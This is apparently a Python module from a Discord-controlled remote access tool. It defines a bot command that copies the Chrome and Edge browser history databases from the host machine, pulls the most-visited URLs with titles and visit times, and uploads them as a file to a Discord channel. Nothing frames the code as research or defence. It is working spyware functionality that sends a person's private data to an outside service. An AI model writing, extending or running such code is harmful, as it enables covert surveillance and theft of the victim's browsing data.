import discord
import os
import sqlite3
import datetime
import shutil
import platform
import requests

async def getbrowserhistory(ctx):
    def fetch_chrome_history():
        try:
            if os.name == 'nt':
                app_data_path = os.getenv('LOCALAPPDATA')
                history_db = os.path.join(app_data_path, r"Google\Chrome\User Data\Default\History")
            else:
                history_db = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/History")
            
            return fetch_browser_history(history_db, "Chrome")
        
        except Exception as e:
            return f"Error fetching Chrome history: {str(e)}"

    def fetch_edge_history():
        try:
            if os.name == 'nt':
                app_data_path = os.getenv('LOCALAPPDATA')
                history_db = os.path.join(app_data_path, r"Microsoft\Edge\User Data\Default\History")
            else:
                history_db = os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/History")
            
            return fetch_browser_history(history_db, "Edge")
        
        except Exception as e:
            return f"Error fetching Edge history: {str(e)}"

    def fetch_browser_history(history_db, browser_name):
        try:
            temp_db = "temp_history.db"
            shutil.copyfile(history_db, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 10")
            history = cursor.fetchall()

            history_text = f"Top 10 visited URLs from {browser_name}:\n"
            for url, title, visit_count, last_visit_time in history:
                last_visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time / 10)
                last_visit_time_str = last_visit_time.strftime("%Y-%m-%d %H:%M:%S")

                history_text += f"{url} - {title} (Visited {visit_count} times, Last visited: {last_visit_time_str})\n"

            conn.close()
            os.remove(temp_db)

            return history_text

        except Exception as e:
            return f"Error fetching history from {browser_name}: {str(e)}"

    chrome_history = fetch_chrome_history()
    edge_history = fetch_edge_history()

    combined_history = chrome_history + "\n\n" + edge_history

    file_path = "browser_history.txt"
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(combined_history)

    file_to_send = discord.File(file_path, filename="browser_history.txt")
    await ctx.send("Browser history generated.", file=file_to_send)

    os.remove(file_path)
